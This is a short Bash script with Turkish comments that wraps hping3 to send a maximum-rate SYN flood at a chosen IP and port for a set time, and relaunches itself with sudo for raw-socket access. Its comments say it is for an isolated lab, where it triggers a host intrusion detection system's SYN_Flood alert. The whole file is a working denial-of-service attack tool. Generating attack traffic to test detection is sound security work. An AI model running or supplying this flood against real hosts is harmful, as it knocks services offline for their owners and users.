#!/usr/bin/env bash
# =============================================================================
# simple_ddos.sh — Basit hacimsel DoS (SYN flood). SALDIRGAN VM'de çalıştırın.
#
# Kullanım:
#   sudo bash simple_ddos.sh                         # hedef=192.168.137.238, port 80, 15s
#   sudo bash simple_ddos.sh <HEDEF_IP> <PORT> <SURE_SN>
#   sudo bash simple_ddos.sh 192.168.137.238 80 20
#
# HIDS etiketi: SYN flood → "SYN_Flood"  (tek port, gerçek kaynak IP).
# NOT: --rand-source KULLANMAYIN; HIDS kaynak IP başına sayar, spoof tespiti
# atlatır. Gerçek kaynaktan göndererek alarmı tetikliyoruz.
# UYARI: yalnızca kendi izole laboratuvarınızda (kendi VM'leriniz).
# =============================================================================
set -u
TARGET="${1:-192.168.137.238}"   # kurban VM (SimVM-Normal)
PORT="${2:-80}"
DUR="${3:-15}"

# root değilse sudo ile yeniden başlat (raw socket gerekir)
[ "$(id -u)" -ne 0 ] && exec sudo "$0" "$TARGET" "$PORT" "$DUR"

command -v hping3 >/dev/null 2>&1 || { echo "[HATA] hping3 yok:  sudo apt install -y hping3"; exit 1; }

echo "[*] DDoS/SYN flood → ${TARGET}:${PORT}   süre=${DUR}s   (gerçek kaynak IP, spoof yok)"
echo "[*] Durdurmak için Ctrl+C."
ping -c1 -W2 "$TARGET" >/dev/null 2>&1 && echo "[ok] hedef erişilebilir" || echo "[uyarı] hedef ping'e yanıt vermiyor (yine de deniyorum)"

# -S: SYN | -p: port | --flood: maksimum hız | timeout: otomatik durdurma
timeout "${DUR}s" hping3 -S -p "$PORT" --flood "$TARGET" || true
echo "[bitti] Flood durdu."
